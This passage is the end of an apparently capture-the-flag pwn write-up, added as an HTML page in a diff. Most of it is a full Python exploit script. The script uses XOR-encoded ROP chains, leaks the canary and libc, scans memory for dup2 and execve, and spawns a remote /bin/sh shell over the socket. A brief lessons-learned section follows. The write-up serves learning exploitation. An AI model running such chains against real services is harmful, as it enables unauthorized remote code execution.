+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x8</span> <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(text_section_write_plt <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Pad to the end of buffer</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">1032</span> <span style="color:#f92672">-</span> len(payload))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(canary <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(buffer_addr <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(text_section_leave_ret <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>connect(SERVER)
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4096</span>)  <span style="color:#75715e"># server hello</span>
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>send(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    write_libc <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">8</span>)
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;write@libc:&#34;</span>, hex(unpack(write_libc))
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Libc scan</span>
+</span></span><span style="display:flex;"><span>    libc_page <span style="color:#f92672">=</span> unpack(write_libc) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfffffffffffff000</span>
+</span></span><span style="display:flex;"><span>    page_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1000</span>
+</span></span><span style="display:flex;"><span>    dup2_start      <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join([chr(t) <span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> [<span style="color:#ae81ff">0xb8</span>,	<span style="color:#ae81ff">0x21</span>,	<span style="color:#ae81ff">0x00</span>,	<span style="color:#ae81ff">0x00</span>,	<span style="color:#ae81ff">0x00</span>,	<span style="color:#ae81ff">0x0f</span>,	<span style="color:#ae81ff">0x05</span>]])
+</span></span><span style="display:flex;"><span>    execve_start    <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join([chr(t) <span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> [<span style="color:#ae81ff">0xb8</span>,	<span style="color:#ae81ff">0x3b</span>,	<span style="color:#ae81ff">0x00</span>,	<span style="color:#ae81ff">0x00</span>,	<span style="color:#ae81ff">0x00</span>,	<span style="color:#ae81ff">0x0f</span>,	<span style="color:#ae81ff">0x05</span>]])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    dup2_remote_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    execve_remote_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># scan down</span>
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;Scanning down&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> dup2_remote_addr <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">or</span> execve_remote_addr <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;davide&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;AA&#34;</span>
+</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">+=</span> p64(gadget_pop_rdi_ret <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x4</span> <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">+=</span> p64(gadget_pop_rsi_pop_r15_ret <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">+=</span> p64(libc_page <span style="color:#f92672">^</span> Ds)   <span style="color:#75715e"># buffer = page</span>
+</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x1337</span>)   <span style="color:#75715e"># pop r15, dont-care</span>
+</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">+=</span> p64(gadget_pop_rdx_ret <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">+=</span> p64(page_size <span style="color:#f92672">^</span> Ds)  <span style="color:#75715e"># length</span>
+</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">+=</span> p64(text_section_write_plt <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># Pad to the end of buffer</span>
+</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">1032</span> <span style="color:#f92672">-</span> len(payload))
+</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">+=</span> p64(canary <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">+=</span> p64(buffer_addr <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">+=</span> p64(text_section_leave_ret <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>            s<span style="color:#f92672">.</span>connect(SERVER)
+</span></span><span style="display:flex;"><span>            s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4096</span>)  <span style="color:#75715e"># server hello</span>
+</span></span><span style="display:flex;"><span>            s<span style="color:#f92672">.</span>send(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            page_data <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>recv(page_size)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> len(page_data) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> dup2_start <span style="color:#f92672">in</span> page_data:
+</span></span><span style="display:flex;"><span>                dup2_remote_addr <span style="color:#f92672">=</span> libc_page <span style="color:#f92672">+</span> page_data<span style="color:#f92672">.</span>index(dup2_start)
+</span></span><span style="display:flex;"><span>                print <span style="color:#e6db74">&#34;Found dup2 @ </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(hex(dup2_remote_addr))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> execve_start <span style="color:#f92672">in</span> page_data:
+</span></span><span style="display:flex;"><span>                execve_remote_addr <span style="color:#f92672">=</span> libc_page <span style="color:#f92672">+</span> page_data<span style="color:#f92672">.</span>index(execve_start)
+</span></span><span style="display:flex;"><span>                print <span style="color:#e6db74">&#34;Found execve @ </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(hex(execve_remote_addr))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            s<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>            libc_page <span style="color:#f92672">-=</span> page_size  <span style="color:#75715e"># scan down</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">EOFError</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># scan up</span>
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;scanning up&#34;</span>
+</span></span><span style="display:flex;"><span>    libc_page <span style="color:#f92672">=</span> unpack(write_libc) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfffffffffffff000</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> dup2_remote_addr <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">or</span> execve_remote_addr <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;davide&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;AA&#34;</span>
+</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">+=</span> p64(gadget_pop_rdi_ret <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x4</span> <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">+=</span> p64(gadget_pop_rsi_pop_r15_ret <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">+=</span> p64(libc_page <span style="color:#f92672">^</span> Ds)   <span style="color:#75715e"># buffer = page</span>
+</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x1337</span>)   <span style="color:#75715e"># pop r15, dont-care</span>
+</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">+=</span> p64(gadget_pop_rdx_ret <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">+=</span> p64(page_size <span style="color:#f92672">^</span> Ds)  <span style="color:#75715e"># length</span>
+</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">+=</span> p64(text_section_write_plt <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># Pad to the end of buffer</span>
+</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">1032</span> <span style="color:#f92672">-</span> len(payload))
+</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">+=</span> p64(canary <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">+=</span> p64(buffer_addr <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">+=</span> p64(text_section_leave_ret <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>            s<span style="color:#f92672">.</span>connect(SERVER)
+</span></span><span style="display:flex;"><span>            s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4096</span>)  <span style="color:#75715e"># server hello</span>
+</span></span><span style="display:flex;"><span>            s<span style="color:#f92672">.</span>send(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            page_data <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>recv(page_size)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> len(page_data) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> dup2_start <span style="color:#f92672">in</span> page_data:
+</span></span><span style="display:flex;"><span>                dup2_remote_addr <span style="color:#f92672">=</span> libc_page <span style="color:#f92672">+</span> page_data<span style="color:#f92672">.</span>index(dup2_start)
+</span></span><span style="display:flex;"><span>                print <span style="color:#e6db74">&#34;Found dup2 @ </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(hex(dup2_remote_addr))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> execve_start <span style="color:#f92672">in</span> page_data:
+</span></span><span style="display:flex;"><span>                execve_remote_addr <span style="color:#f92672">=</span> libc_page <span style="color:#f92672">+</span> page_data<span style="color:#f92672">.</span>index(execve_start)
+</span></span><span style="display:flex;"><span>                print <span style="color:#e6db74">&#34;Found execve @ </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(hex(execve_remote_addr))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            s<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>            libc_page <span style="color:#f92672">+=</span> page_size  <span style="color:#75715e"># scan down</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">EOFError</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;libc scan over&#34;</span>
+</span></span><span style="display:flex;"><span>    text_section_close_plt <span style="color:#f92672">=</span> text_section_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x960</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Final payload for remote shell</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;davide&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;AA&#34;</span>  <span style="color:#75715e"># address of that is buffer_start_addr</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># close(0)</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(gadget_pop_rdi_ret <span style="color:#f92672">^</span> Ds)  <span style="color:#75715e"># first, we ret here &lt;---- (</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span> <span style="color:#f92672">^</span> Ds)                 <span style="color:#75715e"># pop this to RDI</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(text_section_close_plt <span style="color:#f92672">^</span> Ds)           <span style="color:#75715e"># ret there</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># close(1)</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(gadget_pop_rdi_ret <span style="color:#f92672">^</span> Ds)  <span style="color:#75715e"># return from above to here</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x1</span> <span style="color:#f92672">^</span> Ds)                 <span style="color:#75715e"># pop this to RDI</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(text_section_close_plt <span style="color:#f92672">^</span> Ds)           <span style="color:#75715e"># ret there</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># dup2(4,0)</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(gadget_pop_rdi_ret <span style="color:#f92672">^</span> Ds)  <span style="color:#75715e"># return from above to here</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x4</span> <span style="color:#f92672">^</span> Ds)                 <span style="color:#75715e"># pop this to RDI (socket&#39;s FD)</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(gadget_pop_rsi_pop_r15_ret <span style="color:#f92672">^</span> Ds) <span style="color:#75715e"># ret to this gadget</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span> <span style="color:#f92672">^</span> Ds)                 <span style="color:#75715e"># pop rsi</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xdeadbeefdeadbeef</span>)       <span style="color:#75715e"># pop r15 (dont care)</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(dup2_remote_addr <span style="color:#f92672">^</span> Ds)           <span style="color:#75715e"># call dup2</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># dup2(4,1)</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(gadget_pop_rdi_ret <span style="color:#f92672">^</span> Ds)  <span style="color:#75715e"># return from above to here</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x4</span> <span style="color:#f92672">^</span> Ds)  <span style="color:#75715e"># pop this to RDI (socket&#39;s FD)</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(gadget_pop_rsi_pop_r15_ret <span style="color:#f92672">^</span> Ds)  <span style="color:#75715e"># ret to this gadget</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x1</span> <span style="color:#f92672">^</span> Ds)  <span style="color:#75715e"># pop rsi</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xdeadbeefdeadbeef</span>)  <span style="color:#75715e"># pop r15 (dont care)</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(dup2_remote_addr <span style="color:#f92672">^</span> Ds)  <span style="color:#75715e"># call dup2</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># When back from dup2, load arguments for execve</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(gadget_pop_rdi_ret <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    stack_bin_sh <span style="color:#f92672">=</span> buffer_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">224</span>  <span style="color:#75715e"># will be placed in a few line from now</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(stack_bin_sh <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Second argument for execve = NULL</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(gadget_pop_rdx_ret <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span> <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Third argument for execve = NULL</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(gadget_pop_rsi_pop_r15_ret <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span> <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xdeadbeefdeadbeef</span> <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># jump to execve</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64((gadget_pop_rdx_ret <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(execve_remote_addr <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># place /bin/sh on the stack </span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join([chr(ord(t) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0xd</span>) <span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> <span style="color:#e6db74">&#34;/bin/sh&#34;</span>])
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> chr(<span style="color:#ae81ff">0x0</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">0xd</span>)  <span style="color:#75715e"># terminating null</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Pad to the end of buffer</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">1032</span> <span style="color:#f92672">-</span> len(payload))
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(canary <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(buffer_addr <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(text_section_leave_ret <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    sock <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket()
+</span></span><span style="display:flex;"><span>    sock<span style="color:#f92672">.</span>connect(SERVER)
+</span></span><span style="display:flex;"><span>    sock<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4096</span>)  <span style="color:#75715e"># server hello</span>
+</span></span><span style="display:flex;"><span>    sock<span style="color:#f92672">.</span>send(payload)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#interactive mode</span>
+</span></span><span style="display:flex;"><span>    t <span style="color:#f92672">=</span> Telnet()
+</span></span><span style="display:flex;"><span>    t<span style="color:#f92672">.</span>sock <span style="color:#f92672">=</span> sock
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;Starting interactive session:&#34;</span>
+</span></span><span style="display:flex;"><span>    t<span style="color:#f92672">.</span>interact()
+</span></span><span style="display:flex;"><span>    sock<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div><h3 id="note-to-self">Note to self</h3>
+<p>This challenge was more difficult than I&rsquo;ve expected. I thought that I have pretty much have seen it all when it comes to pwn challenges and everything I would encounter is just more complex programs&hellip; I was wrong!</p>
+<ul>
+<li>
+<p>The frame pointer on the stack, usually ignored, can be very important when you do not have enough bytes to override past the buffer! understanding the <code>leave</code> instruction and stack pivoting turns out to be very helpful here</p>
+</li>
+<li>
+<p>Not finding the leaked libc address in the databases was very frustrating&hellip; but then again, this could happen in the real world - I guess sometimes you encounter library versions and small modifications that make you come up with creative solutions like scanning the entire thing for gadgets yourself</p>
+</li>
+<li>
+<p>Docker, a very cool tool to have that I definitely need to learn more about</p>
+</li>
+</ul>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
